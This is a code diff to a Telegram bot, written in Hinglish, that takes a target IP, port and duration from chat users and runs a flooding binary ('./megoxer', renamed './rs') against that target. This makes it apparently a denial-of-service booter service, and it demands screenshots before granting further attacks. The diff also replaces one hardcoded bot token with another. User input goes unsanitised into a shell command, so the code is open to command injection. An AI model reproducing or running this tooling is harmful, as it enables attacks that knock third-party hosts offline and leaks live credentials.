@@ -7,7 +7,7 @@ import threading
 from telebot import types
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7555897511:AAHmnfjbrFrFeqb4SSEGAUWObEuTl-OgfIc')
+bot = telebot.TeleBot('7555897511:AAEu2t03g6Q-9OaD0j2qluudKkkHww3POT8')
 
 # Group and channel details
 GROUP_ID = "-1002369239894"
@@ -34,22 +34,25 @@ def create_check_button():
     markup.add(button)
     return markup
 
-# Background function to update attack status in the same message
+# Background function to update attack status
 def update_attack_status(chat_id, message_id):
     global is_attack_running, attack_end_time
 
     while is_attack_running:
-        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
+        remaining_time = max(0, (attack_end_time - datetime.datetime.now()).total_seconds())  # Fixed
+
         if remaining_time <= 0:
             bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="✅ **Attack Khatam! Ab screenshot bhej!** 📸")
             is_attack_running = False
-            attack_end_time = None  # ✅ Fix added here
+            attack_end_time = None  
             return
+
         try:
             bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                                   text=f"⏳ **Attack chal raha hai... Bacha hua time: {int(remaining_time)}s**")
         except:
             pass  
+        
         time.sleep(1)
 
 # Handle attack command
@@ -76,7 +79,7 @@ def handle_attack(message):
         return
 
     if len(command) != 4:
-        bot.reply_to(message, "⚠️ **Usage: /RS <IP> <PORT> <TIME> POWER BY - @R_SDanger**")
+        bot.reply_to(message, "⚠️ **Usage: /RS <IP> <PORT> <TIME>**")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -112,25 +115,25 @@ def handle_attack(message):
     bot.send_message(message.chat.id, f"🚀 **Attack Shuru!**\n🎯 `{target}:{port}`\n⏳ {time_duration}s👇BETA SCREENSHOT BHEJ AB", parse_mode="Markdown")
 
     try:
-        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
+        subprocess.run(f"./rs {target} {port} {time_duration}", shell=True, check=True)
     except subprocess.CalledProcessError:
         bot.reply_to(message, "❌ **Attack fail ho gaya!**")
         is_attack_running = False
         attack_end_time = None
-        update_thread = None  # ✅ Fix added here
+        update_thread = None  
         return
 
     bot.send_message(message.chat.id, "✅ **Attack Khatam!** 🎯\n📸 **Ab screenshot bhej, warna agla attack nahi milega!**")
 
     is_attack_running = False
     attack_end_time = None
-    update_thread = None  # ✅ Fix added here
+    update_thread = None  
 
 # Handle check status button click
 @bot.callback_query_handler(func=lambda call: call.data == 'check_status')
 def callback_check_status(call):
     if is_attack_running and attack_end_time:
-        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
+        remaining_time = max(0, (attack_end_time - datetime.datetime.now()).total_seconds())  # Fixed
         bot.reply_to(call.message, f"⏳ **Attack chal raha hai! Bacha hua time: {int(remaining_time)}s**")
     else:
         bot.reply_to(call.message, "✅ **Koi attack active nahi hai!**")
@@ -139,12 +142,12 @@ def callback_check_status(call):
 @bot.message_handler(commands=['check'])
 def handle_check(message):
     if is_attack_running and attack_end_time:
-        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
+        remaining_time = max(0, (attack_end_time - datetime.datetime.now()).total_seconds())  # Fixed
         bot.reply_to(message, f"⏳ **Attack chal raha hai... Bacha hua time: {int(remaining_time)}s**")
     else:
         bot.reply_to(message, "✅ **Koi attack active nahi hai!**")
 
-# Handle screenshot submission and forward to main channel
+# Handle screenshot submission
 @bot.message_handler(content_types=['photo'])
 def handle_screenshot(message):
     user_id = str(message.from_user.id)
